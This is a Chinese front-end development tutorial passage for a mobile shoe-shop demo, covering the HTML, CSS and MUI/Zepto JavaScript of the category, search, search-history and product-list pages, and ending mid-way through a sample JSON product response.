.ct_nav a{
    float: left;
    width: 33.3333%;
}
.ct_nav a img{
    display: block;
    width: 100%;
}
/*商品*/
.ct_product{
    width: 100%;
    padding: 0 10px;
}
.ct_product .pro_item{
    width: 48%;
    float: left;
    margin-top: 10px;
}
.ct_product .pro_item:nth-child(2n){
    margin-left: 4%;
}
.ct_product .pro_item .pro_item_box{
    width: 100%;
    min-height: 200px;
    box-shadow: 0 0 3px #ddd;
    display: block;
    text-align: center;
    padding: 10px 0;
}
.ct_product .pro_item .pro_item_box img{
    width: 100%;
    display: block;
}
.ct_product .pro_item .pro_item_box p:first-of-type{
    padding: 0 10px;
}
.ct_product .pro_item .pro_item_box .nowPrice{
    font-size: 12px;
    color: red;
}
.ct_product .pro_item .pro_item_box p:last-of-type{
    text-align: center;
}
.ct_product .pro_item .pro_item_box .oldPrice{
    font-size: 12px;
    color: #ccc;
    text-decoration: line-through;
}
.ct_product .pro_item .pro_item_box button{
    background: #006699;
    color: #fff;
}
```
>[danger] ##### index.js
```
$(function () {
    mui('.mui-scroll-wrapper').scroll({
        deceleration: 0.0005 ,//flick 减速系数，系数越大，滚动速度越慢，滚动距离越小，默认值0.0006
        bounce: true //是否启用回弹
    });
    mui('.mui-slider').slider({
        interval:2000,

    });
})
```
>[success] # 分类页
```
1.布局分析 最外面的 <div class="ct_container">依次嵌套三个内容，分别是
 头部内容 <header class="ct_header">，中心内容  <div  class="ct_content">,底部菜单<footer class="ct_footer">
2.中间区域内容也该是可以滑动这里选用mui 的插件，则需要使用插件规定
 的内容嵌套样式mui-scroll-wrapper和mui-scroll
3.将这个中间内容分成左右区域布局
```  
![](https://box.kancloud.cn/4b8c536976b86c1df3111ffc36ebd75c_394x639.png)
>[danger] ##### category.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是...">
    <meta name="Keywords" content="乐淘">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fa/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/category.css">
    <title>传淘-分类</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>分类查询</h3>
        <a href="search.html" class="right"><span class="fa fa-search"></span></a>
    </header>

    <div class="ct_content">
        <div class="ct_wapper">
            <div class="mui-scroll-wrapper">
                <div class="mui-scroll">
                    <div class="cate_left">
                        <ul>
                            <li class="now"><a href="#">ceshi</a></li>
                            <li><a href="#">ceshi</a></li>
                            <li><a href="#">ceshi</a></li>
                            <li><a href="#">ches</a></li>
                        </ul>
                    </div>
                    <div class="cate_right">
                        <ul>
                            <li><a><img src="images/brand1.png"><p>耐克</p></a></li>
                            <li><a><img src="images/brand1.png"><p>耐克</p></a></li>
                            <li><a><img src="images/brand1.png"><p>耐克</p></a></li>
                            <li><a><img src="images/brand1.png"><p>耐克</p></a></li>


                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer class="ct_footer">
        <a class="tab_home fa fa-home" href="index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars now" href="category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart" href="cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
    </footer>
</div>
<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="js/category.js"></script>
</body>
</html>
```
>[danger] ##### category.css
```
/*一级分类*/
.cate_left{
    width: 90px;
    height: 100%;
    float: left;
    overflow: hidden;
}
.cate_left ul{
    width: 100%;
    height: auto;
}
.cate_left ul li{
    height: 50px;
    width: 100%;
    line-height:50px;
    text-align: center;
    background: #f3f4f5;
    border-bottom: 1px solid #ccc;
    border-right: 1px solid #ccc;
}
.cate_left ul li.now{
    background: #fff;

    border-right: none;
}
.cate_left ul li a{
    display: block;
    color: #333;
    font-size: 14px;
}
.cate_left ul li.now a{
    color: orange;
}

.cate_right{
    overflow: hidden;
    padding: 0 10px;
}
.cate_right ul{
    width: 100%;
}
.cate_right ul li{
    width: 33.3333%;
    float: left;
    padding-top: 10px;
}
.cate_right ul li a{
    display: block;
    width: 100%;
}
.cate_right ul li a img{
    width: 60px;
    height: 60px;
    margin: 0 auto;
    display: block;
}
.cate_right ul li a p{
    text-align: center;
    color: #666;
}
```
>[success] # 分类页动态生成
```
1.通过利用ajax 异步动态生成商品
2.利用模板动模板生成左右栏显示效果
```
>[danger] ##### html页面
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克、阿迪达斯、李宁、匡威等国内外知名品牌的篮球鞋,板鞋,休闲鞋,跑步鞋,帆布...">
    <meta name="Keywords" content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋 足球鞋 休闲鞋 凉鞋 户外鞋 布洛克 高跟鞋 单鞋 豆豆鞋 乐福鞋 牛津鞋 凉拖 皮鞋 短靴 长靴 登山鞋 徒步鞋 硫化鞋 训练鞋 溯溪鞋 越野鞋 板鞋 足球鞋 网球鞋 赛车鞋 雪地靴 马丁靴 商务 英伦">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fa/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/category.css">
    <title>传淘-分类</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>分类查询</h3>
        <a href="search.html" class="right"><span class="fa fa-search"></span></a>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <div class="mui-scroll-wrapper">
                <div class="mui-scroll">
                    <!--一级分类-->
                    <div class="cate_left">
                        <ul>
                            <!--TODO-->
                        </ul>
                    </div>
                    <!--二级分类-->
                    <div class="cate_right">
                        <ul>
                            <!--TODO-->
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="ct_footer">
        <a class="tab_home fa fa-home" href="index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars now" href="category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart" href="cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
    </footer>
</div>
<script src="assets/artTemplate/template-native.js"></script>

<script type="text/template" id="firstTemplate">
    <% for(var i = 0 ; i < rows.length ; i ++){ %>
    <li class="<%=i==0?'now':''%>"><a href="javascript:;" data-id="<%=rows[i].id%>"><%=rows[i].categoryName%></a></li>
    <% } %>
</script>

<script type="text/template" id="secondTemplate">
    <% if(rows.length){  %>
    <% for(var i = 0 ; i < rows.length ; i ++){ %>
    <li><a href="javascript:;"><img src="<%=rows[i].brandLogo%>" alt=""><p><%=rows[i].brandName%></p></a></li>
    <% } %>
    <% }else{ %>
    <p>当前分类没有数据</p>
    <% } %>
</script>
<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="js/category.js"></script>
</body>
</html>
```
>[danger] ##### js
```
1.首先编写页加载进来的的选项默认第一个标签
2.在编写点击后发生的事件
3.在第二步点击事件中增加了，点击统一事件不在请求后台的if 判断
```
```
$(function () {
    /*1.一级分类默认渲染 第一个一级分类对应的二级分类*/
    getFirstCategoryData(function (data) {
        /*一级分类默认渲染*/
        /*模版的使用顺序：json数据,定义模版，调用模版，返回html*/
        $('.cate_left ul').html(template('firstTemplate',data));
        /*绑定事件*/
        /*initSecondTapHandle();*/
        /*第一个一级分类对应的二级分类*/
        var categoryId = $('.cate_left ul li:first-child').find('a').attr('data-id');
        render(categoryId);
    });

    /*2.点击一级分类加载对应的二级分类*/
    $('.cate_left').on('tap','a',function (e) {
        /*当前选中的时候不去加载*/
        if($(this).parent().hasClass('now')) return false;
        /*样式的选中功能*/
        $('.cate_left li').removeClass('now');
        $(this).parent().addClass('now');
        /*数据的渲染*/
        render( $(this).attr('data-id'));
    });
});
/*获取一级分类的数据*/
var getFirstCategoryData = function (callback) {
    $.ajax({
        url:'/category/queryTopCategory',
        type:'get',
        data:'',
        dataType:'json',
        success:function (data) {
            callback && callback(data);
        }
    });
};
/*获取二级分类的数据*/
/*params = {id:1}*/
var getSecondCategoryData = function (params,callback) {
    $.ajax({
        url:'/category/querySecondCategory',
        type:'get',
        data:params,
        dataType:'json',
        success:function (data) {
            callback && callback(data);
        }
    });
};
/*渲染*/
var render = function (categoryId) {
    getSecondCategoryData({
        id:categoryId
    },function (data) {
        /*二级分类默认*/
        $('.cate_right ul').html(template('secondTemplate',data));
    });
}
```

[TOC]
>[success] # 搜索页
![](https://box.kancloud.cn/6db3290608f275289746c9582318da82_338x599.png)
>[danger] ##### html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克、阿迪达斯、李宁、匡威等国内外知名品牌的篮球鞋,板鞋,休闲鞋,跑步鞋,帆布...">
    <meta name="Keywords" content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋 足球鞋 休闲鞋 凉鞋 户外鞋 布洛克 高跟鞋 单鞋 豆豆鞋 乐福鞋 牛津鞋 凉拖 皮鞋 短靴 长靴 登山鞋 徒步鞋 硫化鞋 训练鞋 溯溪鞋 越野鞋 板鞋 足球鞋 网球鞋 赛车鞋 雪地靴 马丁靴 商务 英伦">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/search.css">
    <title>传淘-搜索中心</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>搜索中心</h3>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <!--搜索输入区域-->
            <div class="ct_search">
                <!--在移动断调用虚拟键盘的时候 enter键变成 搜索按钮 -->
                <form action="#">
                    <input type="search" placeholder="搜索你喜欢的商品">
                </form>
                <a href="javascript:;">搜索</a>
            </div>
            <!--搜索的历史区域-->
            <div class="ct_history"></div>
        </div>
    </div>
    <footer class="ct_footer">
        <a class="tab_home fa fa-home" href="index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars" href="category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart" href="cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
    </footer>
</div>
<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="js/search.js"></script>
</body>
</html>

```
>[danger] ##### search.css
```
/*search 整个搜索模块的样式*/
/*搜索框模块*/
.ct_search{
    width: 100%;
    padding: 10px;
    position: relative;
}
.ct_search input{
    width: 100%;
    height: 30px;
    border: 1px solid #006699;
    line-height: 28px;
    background: #fff;
    font-size: 12px;
    text-align: left;
    padding: 0 0 0 10px;
    border-radius: 4px;
}
.ct_search a{
    width: 60px;
    height: 30px;
    background: #006699;
    color: #fff;
    position: absolute;
    right: 10px;
    top: 10px;
    /* 前四个是x轴方向的半径 */
    /* 后四个是y轴方向的半径 */
    /*border-radius:0 0 0 0 / 0 0 0 0;*/
    border-top-right-radius: 4px;
    border-bottom-right-radius: 4px;
    text-align: center;
    line-height: 30px;
    font-size: 14px;
}
/*排序模块*/
.ct_order{
    width: 100%;
    background: #efeff4;
    height: 30px;
}
.ct_order a{
    width: 25%;
    float: left;
    height: 30px;
    color: #333;
    text-align: center;
    line-height: 30px;
    font-size: 12px;
}
.ct_order a.now{
    color: orange;
}
/*商品模块*/
/*商品*/
.ct_product{
    width: 100%;
    padding: 0 10px;
}
.ct_product .pro_item{
    width: 48%;
    float: left;
    margin-top: 10px;
}
.ct_product .pro_item:nth-child(2n){
    margin-left: 4%;
}
.ct_product .pro_item .pro_item_box{
    width: 100%;
    min-height: 200px;
    box-shadow: 0 0 3px #ddd;
    display: block;
    text-align: center;
    padding: 10px 0;
}
.ct_product .pro_item .pro_item_box img{
    width: 100%;
    display: block;
}
.ct_product .pro_item .pro_item_box p:first-of-type{
    padding: 0 10px;
}
.ct_product .pro_item .pro_item_box .nowPrice{
    font-size: 12px;
    color: red;
}
.ct_product .pro_item .pro_item_box p:last-of-type{
    text-align: center;
}
.ct_product .pro_item .pro_item_box .oldPrice{
    font-size: 12px;
    color: #ccc;
    text-decoration: line-through;
}
.ct_product .pro_item .pro_item_box button{
    background: #006699;
    color: #fff;
}
```
>[danger] ##### search.js
```
1.字符串为空的时候增加禁止a连接跳转的return false
```
```
$(function () {
   $('.ct_search a').on('tap',function () {
        /*跳转去搜索列表页 并且需要带上关键字*/
        var key = $.trim($('input').val());
        /*判断  没有关键字就提示用户“请输入关键字搜索”*/
        if(!key){
            /*mui 消息提示*/
            mui.toast('请输入关键字');
            return false;
        }
        /*如果合法*/
        /*searchList.html?key=xxx*/
        location.href = 'searchList.html?key='+key;
   });
});
```
>[success] # sreaclist 商品列表页
![](https://box.kancloud.cn/dd01853e16e21b7d79a100ac498e4fdf_337x598.png)
>[danger] ##### sreacList.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克、阿迪达斯、李宁、匡威等国内外知名品牌的篮球鞋,板鞋,休闲鞋,跑步鞋,帆布...">
    <meta name="Keywords"
          content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋 足球鞋 休闲鞋 凉鞋 户外鞋 布洛克 高跟鞋 单鞋 豆豆鞋 乐福鞋 牛津鞋 凉拖 皮鞋 短靴 长靴 登山鞋 徒步鞋 硫化鞋 训练鞋 溯溪鞋 越野鞋 板鞋 足球鞋 网球鞋 赛车鞋 雪地靴 马丁靴 商务 英伦">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/search.css">
    <title>传淘-商品列表</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>搜索中心</h3>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <div class="mui-scroll-wrapper">
                <div class="mui-scroll">
                    <!--搜索框-->
                    <div class="ct_search">
                        <form action="#">
                            <input type="search" placeholder="搜索你喜欢的商品">
                        </form>
                        <a href="javascript:;">搜索</a>
                    </div>
                    <!--排序-->
                    <div class="ct_order">
                        <a href="#" class="now">上架时间 <span class="fa fa-angle-down"></span></a>
                        <a href="#">价格 <span class="fa fa-angle-down"></span></a>
                        <a href="#">销量 <span class="fa fa-angle-down"></span></a>
                        <a href="#">折扣 <span class="fa fa-angle-down"></span></a>
                    </div>
                    <!--商品区域-->
                    <div class="ct_product">
                        <div class="pro_item">
                            <a href="#" class="pro_item_box">
                                <img src="images/product.jpg" alt="">
                                <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                <button class="button">立即购买</button>
                            </a>
                        </div>
                        <div class="pro_item">
                            <a href="#" class="pro_item_box">
                                <img src="images/product.jpg" alt="">
                                <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                <button class="button">立即购买</button>
                            </a>
                        </div>
                        <div class="pro_item">
                            <a href="#" class="pro_item_box">
                                <img src="images/product.jpg" alt="">
                                <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                <button class="button">立即购买</button>
                            </a>
                        </div>
                        <div class="pro_item">
                            <a href="#" class="pro_item_box">
                                <img src="images/product.jpg" alt="">
                                <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                <button class="button">立即购买</button>
                            </a>
                        </div>
                        <div class="pro_item">
                            <a href="#" class="pro_item_box">
                                <img src="images/product.jpg" alt="">
                                <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                <button class="button">立即购买</button>
                            </a>
                        </div>
                        <div class="pro_item">
                            <a href="#" class="pro_item_box">
                                <img src="images/product.jpg" alt="">
                                <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                <button class="button">立即购买</button>
                            </a>
                        </div>
                        <div class="pro_item">
                            <a href="#" class="pro_item_box">
                                <img src="images/product.jpg" alt="">
                                <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                <button class="button">立即购买</button>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="ct_footer">
        <a class="tab_home fa fa-home" href="index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars" href="category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart" href="cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
    </footer>
</div>
<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="js/searchList.js"></script>
</body>
</html>

```
>[danger] ##### sreacList.css
```
1.和sreach 公用一套样式
```
>[danger] ##### sreacList.js
```
// 为了可以区域滚动
$(function () {
    /*区域滚动*/
    mui('.mui-scroll-wrapper').scroll({
        indicators:false
    });
});

```
>[success] # 历史记录的搜索
![](https://box.kancloud.cn/58cfcf6dc97d6173d324d53df5cbc46e_356x405.png)
>[danger] ##### html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克、阿迪达斯、李宁、匡威等国内外知名品牌的篮球鞋,板鞋,休闲鞋,跑步鞋,帆布...">
    <meta name="Keywords" content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋 足球鞋 休闲鞋 凉鞋 户外鞋 布洛克 高跟鞋 单鞋 豆豆鞋 乐福鞋 牛津鞋 凉拖 皮鞋 短靴 长靴 登山鞋 徒步鞋 硫化鞋 训练鞋 溯溪鞋 越野鞋 板鞋 足球鞋 网球鞋 赛车鞋 雪地靴 马丁靴 商务 英伦">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/search.css">
    <title>传淘-搜索中心</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>搜索中心</h3>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <!--搜索输入区域-->
            <div class="ct_search">
                <!--在移动断调用虚拟键盘的时候 enter键变成 搜索按钮 -->
                <form action="#">
                    <input type="search" placeholder="搜索你喜欢的商品">
                </form>
                <a href="javascript:;">搜索</a>
            </div>
            <!--搜索的历史区域-->
            <div class="cz_history">

            </div>
        </div>
    </div>
    <footer class="ct_footer">
        <a class="tab_home fa fa-home" href="index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars" href="category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart" href="cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
    </footer>
</div>

<script type="text/html" id="searchTpl">
    <% if(model && model.length){ %>
    <div class="mui-clearfix">
        <span class="title">搜索历史</span>
        <span class="icon_clear fa fa-trash"> 清空记录</span>
    </div>
    <ul>
        <% for(var i = model.length-1 ; i >=0 ; i --){ %>
        <li><a data-key="<%=model[i]%>" href="javascript:;"><%=model[i]%></a><span class="icon_delete fa fa-close"></span></li>
        <% } %>
    </ul>
    <%}else{%>
    <span class="title">没有历史搜索记录。</span>
    <%}%>
</script>


<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="js/search.js"></script>
</body>
</html>
```

>[danger] ##### sreach.js
```
1.形成链式调用可以用on 统一从body 开始绑定
2.splice删除功能，第一个参数为第一项位置，第二个参数为要删除几个
array.splice(index,num)，返回值为删除内容，array为结果值。
3.使用html5提供的存储功能 localStorage
4.利用html 存储一些页面信息方便提取
```

```
$(function(){
    /*页面初始化*/
    $('.search_input').val('');
    $('.cz_history').html(template('searchTpl',{model: getSearchData()}));

    /*绑定事件*/
    $('body').on('tap','.search_btn',function(){
        /*搜索*/
        var key = $.trim($('.search_input').val());

        if(!key){
            mui.toast('请输入关键字');
            return false;
        }

        addSearchData(key);

        window.location.href = 'searchList.html?key='+key;

        return false;
    }).on('tap','.icon_clear ',function(){
        /*清空*/
        localStorage.clear();
        $('.cz_history').html(template('searchTpl',{model: getSearchData()}));
    }).on('tap','.icon_delete',function(){
        /*删除*/
        removeSearchData($(this).parent().find('[data-key]').attr('data-key'));
        $('.cz_history').html(template('searchTpl',{model: getSearchData()}));
    }).on('tap','[data-key]',function(){
        window.location.href ='searchList.html?'+'key='+$(this).attr('data-key');
    })

});
/*获取搜索记录*/
var getSearchData = function(){
    return JSON.parse(localStorage.getItem('leTaoSearchHistory') || '[]');
};
/*添加搜索记录*/
var addSearchData = function(key){
    var list = getSearchData();

    $.each(list,function(i,item){
        if(item == key){
            list.splice(i,1);
        }
    });

    list.push(key);

    /*最多记录10条*/
    if(list.length > 10){
        list.splice(0,list.length-10);
    }

    localStorage.setItem('leTaoSearchHistory',JSON.stringify(list));
};
/*删除搜索记录*/
var removeSearchData = function(key){
    var list = getSearchData();
    $.each(list,function(i,item){
        if(item == key){
            list.splice(i,1);
        }
    });
    localStorage.setItem('leTaoSearchHistory',JSON.stringify(list));
};
```
>[success] # 搜索列表页
```
1.从搜索页，搜索后跳转到 搜索列表页，要获取搜索页的连接关键字
```
* 页面展示
![](https://box.kancloud.cn/ee6011ef33e2871dc8eaa059f2b92ceb_362x584.png)
* 选择栏展示
![](https://box.kancloud.cn/ff6448cb8182f9f3ba049a92da677fd4_1381x68.png)
* 下拉刷新展示
![](https://box.kancloud.cn/b8bd9822446d69091c7263cf34030268_1359x222.png)
>[danger] ##### searchList.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克、阿迪达斯、李宁、匡威等国内外知名品牌的篮球鞋,板鞋,休闲鞋,跑步鞋,帆布...">
    <meta name="Keywords"
          content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋 足球鞋 休闲鞋 凉鞋 户外鞋 布洛克 高跟鞋 单鞋 豆豆鞋 乐福鞋 牛津鞋 凉拖 皮鞋 短靴 长靴 登山鞋 徒步鞋 硫化鞋 训练鞋 溯溪鞋 越野鞋 板鞋 足球鞋 网球鞋 赛车鞋 雪地靴 马丁靴 商务 英伦">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/search.css">
    <title>传淘-商品列表</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>搜索中心</h3>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <div id="refreshContainer" class="mui-scroll-wrapper">
                <div class="mui-scroll">
                    <!--搜索框-->
                    <div class="ct_search">
                        <form action="#">
                            <input type="search" placeholder="搜索你喜欢的商品">
                        </form>
                        <a href="javascript:;">搜索</a>
                    </div>
                    <!--排序-->
                    <div class="ct_order">
                        <a href="javascript:;" data-order="time">上架时间 <span class="fa fa-angle-down"></span></a>
                        <a href="javascript:;" data-order="price">价格 <span class="fa fa-angle-down"></span></a>
                        <a href="javascript:;" data-order="num">销量 <span class="fa fa-angle-down"></span></a>
                        <a href="javascript:;" data-order="scale">折扣 <span class="fa fa-angle-down"></span></a>
                    </div>
                    <!--商品区域-->
                    <div class="ct_product">
                        <!--TODO-->
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="ct_footer">
        <a class="tab_home fa fa-home" href="index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars" href="category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart" href="cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
    </footer>
</div>
<!--图片是数组：默认第一张-->
<script type="text/template" id="list">
    <% for(var i = 0; i < data.length ; i++){ %>
    <% var item = data[i]; %>
    <div class="pro_item">
        <a href="product.html?productId=<%=item.id%>" class="pro_item_box">
            <% if(item.pic && item.pic[0]){ %>
            <img src="<%=item.pic[0].picAddr%>">
            <% }else{ %>
            <img src="images/none01.jpg">
            <% } %>
            <p class="mui-ellipsis-2"><%=item.proName%></p>
            <p><span class="nowPrice">&yen;<%=item.price%></span> <span class="oldPrice">&yen;<%=item.oldPrice%></span></p>
            <button class="button">立即购买</button>
        </a>
    </div>
    <% } %>
</script>
<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="js/common.js"></script>
<script src="js/searchList.js"></script>
</body>
</html>
```
>[danger] ##### searchList.css
```
1.和sreach 公用一套样式
```
>[danger] ##### 数据接口
```
{
	"page": 1,
	"size": 4,
	"data": [{
		"id": 1,
		"proName": "匡威三星标1970s converse复刻 142334c 144757c三星标黑色高帮",
